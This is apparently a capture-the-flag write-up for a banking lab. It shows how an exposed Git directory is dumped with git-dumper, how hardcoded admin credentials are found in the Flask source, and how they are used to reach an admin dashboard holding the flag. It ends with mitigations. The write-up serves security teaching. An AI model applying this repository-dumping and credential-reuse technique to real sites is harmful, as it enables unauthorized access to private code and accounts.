---
title: "Exposed Git Repository Leads to Administrative Credential Disclosure | Fault Banking"
date: 2026-06-04 12:00:00 +0530
categories: [A02 - Security Misconfiguration, Source Code Disclosure]
tags: [webverselabs-pro, git-exposure, source-code-disclosure, credential-disclosure, flask]
author: Shivansh Sharma
image:
  path: /assets/images/posts/fault-banking-exposed-git-repository-credential-disclosure.webp
  alt: Fault Banking Exposed Git Repository Leads to Administrative Credential Disclosure
---

## Lab Link

Lab: [Fault Banking](https://dashboard.webverselabs-pro.com/mystery-challenges/fault)

---

## Overview

Fault Banking is a regional banking platform built on Flask that exposes both customer-facing and administrative authentication portals. During assessment, a publicly accessible Git repository was discovered on the web server.

Because the repository contents could be downloaded directly, the application's source code became available for review. Analysis of the recovered code revealed hardcoded administrative credentials that granted access to the internal management console and exposed sensitive service credentials, including the challenge flag.

---

## Objective

Exploit the exposed Git repository to recover administrative credentials and gain access to the internal banking dashboard containing the flag.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A02 - Security Misconfiguration
└── Source Code Disclosure
    └── Exposed Git Repository
        └── Credential Disclosure
```

---

## Reconnaissance

The application exposes separate customer and administrative login portals:

```text
/login
/admin
```

While performing content discovery, an exposed Git repository was identified:

```text
/.git/
```

Public access to version control metadata often results in source code disclosure and should never be accessible from production environments.

---

## Exposed Git Repository Discovery

Visiting the exposed directory confirmed that repository files were available for download.

```text
/.git/
```

Because Git stores the complete version history and source code structure, recovering the repository became the next step.

---

## Repository Extraction

The repository was downloaded locally using Git Dumper:

```bash
git-dumper \
https://e62d522b-4065-fault-450a0.events.webverselabs-pro.com/.git/ \
dumped_repo
```

Navigate into the recovered repository:

```bash
cd dumped_repo
```

---

## Source Code Analysis

After extracting the repository, the Flask application source code was reviewed.

```bash
cat app.py
```

While inspecting the code, hardcoded administrative credentials were discovered:

```python
# Internal-console credentials. The developer who wrote this admin panel
# also committed these to `.env` in the repo — the player exploits the
# reuse, not a flaw in the comparison itself.
_ADMIN_USERNAME = b"alex"
_ADMIN_PASSWORD = b"hhdbjvBankery1"
```

The source code comment explicitly confirms that the credentials were committed to the repository and reused by the administration interface.

---

## Credential Discovery

Recovered credentials:

```text
Username: alex
Password: hhdbjvBankery1
```

These credentials provide access to the administrative portal.

---

## Administrative Access

Navigate to:

```text
/admin
```

Authenticate using the recovered credentials:

```text
alex : hhdbjvBankery1
```

Successful authentication redirects the user to:

```text
/admin/dashboard
```

---

## Flag Disclosure

The administrative dashboard exposes internal service credentials and tokens.

```text
Service credentials & tokens

bootstrap_token         WEBVERSE{.....}
payments_webhook_key    redacted_pci_scope
session_signing_key     rotated_q4_2025_internal_use
smtp_relay_password     redacted_in_vault
```

The flag is disclosed through the `bootstrap_token` value.

---

## Flag

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

Exposed repository:

```text
/.git/
```

Repository extraction:

```bash
git-dumper <target> dumped_repo
```

Credential disclosure:

```python
_ADMIN_USERNAME = b"alex"
_ADMIN_PASSWORD = b"hhdbjvBankery1"
```

Administrative login:

```text
alex : hhdbjvBankery1
```

Dashboard access:

```text
/admin/dashboard
```

Retrieved token:

```text
WEBVERSE{.....}
```

---

## Root Cause Analysis

The primary vulnerability is the exposure of the Git repository through the production web server.

A vulnerable deployment allowed unrestricted access to:

```text
/.git/
```

Once the repository was recovered, attackers could review the application's source code and discover sensitive implementation details.

The impact was amplified by hardcoded administrative credentials stored directly within application code:

```python
_ADMIN_USERNAME = b"alex"
_ADMIN_PASSWORD = b"hhdbjvBankery1"
```

Source code disclosure therefore resulted directly in credential compromise and administrative access.

---

## Impact

An attacker can:

* Recover proprietary source code
* Discover hardcoded credentials
* Access administrative functionality
* Enumerate internal services
* Obtain sensitive tokens and secrets
* Compromise privileged banking operations

In real-world environments, exposed Git repositories frequently lead to complete application compromise.

---

## Mitigation

### Block Access to Git Metadata

Prevent public access to version control directories.

Example:

```nginx
location ~ /\.git {
    deny all;
}
```

---

### Remove Secrets from Source Code

Avoid embedding credentials directly within application files.

Instead of:

```python
_ADMIN_PASSWORD = b"hhdbjvBankery1"
```

Use:

```python
os.getenv("ADMIN_PASSWORD")
```

and store secrets in dedicated secret-management solutions.

---

### Implement Secret Scanning

Integrate automated scanning into development workflows.

Examples:

```text
GitLeaks
TruffleHog
GitGuardian
```

---

### Rotate Exposed Credentials

Any credential committed to source control should be considered compromised and rotated immediately.

---

### Enforce Administrative Hardening

Protect administrative interfaces with additional controls such as:

```text
Multi-Factor Authentication
IP Restrictions
Privileged Access Management
```

---

## Real-World Insight

Exposed Git repositories remain one of the most common security misconfigurations discovered during penetration testing and bug bounty engagements.

Attackers routinely search for publicly accessible `.git` directories because they often contain:

```text
Source code
API keys
Cloud credentials
Database passwords
Administrative secrets
Internal documentation
```

Several real-world breaches have originated from exposed repositories that leaked sensitive credentials and infrastructure secrets.

The Fault Banking challenge demonstrates a critical lesson:

**An exposed repository can transform a simple information disclosure issue into complete administrative compromise.**
